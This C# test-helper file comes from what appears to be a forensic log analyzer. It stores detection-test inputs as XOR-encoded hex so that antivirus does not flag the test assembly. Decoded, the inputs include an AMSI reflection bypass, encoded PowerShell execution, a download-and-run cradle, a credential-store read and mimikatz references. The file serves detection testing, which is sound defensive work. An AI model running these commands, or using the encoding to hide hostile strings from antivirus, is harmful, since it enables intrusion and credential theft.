using System.Security.Cryptography;
using System.Text;

namespace LogAnalyzer.Dfir.Tests;

/// <summary>
/// Some detection tests need input strings that are, by design, offensive-tooling
/// signatures (an AMSI reflection bypass, base64 download cradles, a credential-tool
/// claim, ...). Embedded as plain UTF-8 literals they end up verbatim in the compiled
/// <c>LogAnalyzer.Dfir.Tests.dll</c>, where Microsoft Defender flags the whole assembly as
/// <c>HackTool:Win32/PsAttack.A</c>. The compiled bytes must not carry those sequences,
/// while every test must still exercise the byte-identical input at runtime.
///
/// Each fixture is stored as uppercase-hex of its UTF-8 bytes XOR'd with <see cref="Key"/>
/// and decoded on demand. Member names and the stored data deliberately avoid the literal
/// attack-tool tokens too. <see cref="TestFixtureTextGuardTests"/> hashes every decoded value
/// (SHA-256) against the hash recorded from the original source, proving the decode is
/// byte-identical to the string the product used to see. Do not reintroduce the plaintext.
/// </summary>
internal static class TestFixtureText
{
    private const byte Key = 0xA5;

    private static string Dec(string hex)
    {
        var bytes = Convert.FromHexString(hex);
        for (var i = 0; i < bytes.Length; i++) bytes[i] ^= Key;
        return Encoding.UTF8.GetString(bytes);
    }

    /// <summary>SHA-256 (hex, lowercase) of the UTF-8 bytes of <paramref name="value"/>.</summary>
    internal static string Sha256(string value) =>
        Convert.ToHexString(SHA256.HashData(Encoding.UTF8.GetBytes(value))).ToLowerInvariant();

    // --- encoded fixtures (hex of UTF-8 XOR 0xA5); see TestFixtureTextGuardTests for the recorded hashes ---
    internal static string AmsiReflectionBypass { get; } = Dec("FEF7C0C3F88BE4D6D6C0C8C7C9DC8BE2C0D1F1DCD5C08D82F6DCD6D1C0C88BE8C4CBC4C2C0C8C0CBD18BE4D0D1CAC8C4D1CCCACB8BE4C8D6CCF0D1CCC9D6828C8BE2C0D1E3CCC0C9C18D82C4C8D6CCECCBCCD1E3C4CCC9C0C1828982EBCACBF5D0C7C9CCC689F6D1C4D1CCC6828C8BF6C0D1F3C4C9D0C08D81CBD0C9C98981D1D7D0C08C");
    internal static string EncodedIexBlock { get; } = Dec("81C798FEE6CACBD3C0D7D1F89F9FE3D7CAC8E7C4D6C09391F6D1D7CCCBC28D81D68C9E85CCC0DD858D81DD8C");
    internal static string DownloadCradle { get; } = Dec("CCC0DD858D8DEBC0D288EAC7CFC0C6D185F6DCD6D1C0C88BEBC0D18BF2C0C7E6C9CCC0CBD18C8BE1CAD2CBC9CAC4C1F6D1D7CCCBC28D82CDD1D1D5D69F8A8AC6CAC8C8D0CBCCD1DC8BC0DDC4C8D5C9C08ACCCBD6D1C4C9C98BD5D694828C8C");
    internal static string WebClientProxyIex { get; } = Dec("CCC0DD858D8DEBC0D288EAC7CFC0C6D185EBC0D18BF2C0C7E6C9CCC0CBD18C8BF5D7CADDDC8C");
    internal static string ReflectionTypeProbe { get; } = Dec("FEF7C0C3F88BE4D6D6C0C8C7C9DC8BE2C0D1F1DCD5C08D82DD8BE4C8D6CCF0D1CCC9D6828C");
    internal static string EncodedCredStoreRead { get; } = Dec("81C7859885FEE6CACBD3C0D7D1F89F9FE3D7CAC8E7C4D6C09391F6D1D7CCCBC28D81DD8CAFE2C0D188ECD1C0C8F5D7CAD5C0D7D1DC85EDEEE9E89FF9F6FCF6F1E0E8F9E6D0D7D7C0CBD1E6CACBD1D7CAC9F6C0D1F9E6CACBD1D7CAC9F9E9D6C4AF");
    internal static string CredToolClaim { get; } = Dec("E485D7D0C9C4D1856D3CCC85C8CCC8CCCEC4D1DF8BC0DDC08B");
    internal static string CredToolExe { get; } = Dec("C8CCC8CCCEC4D1DF8BC0DDC0");
}
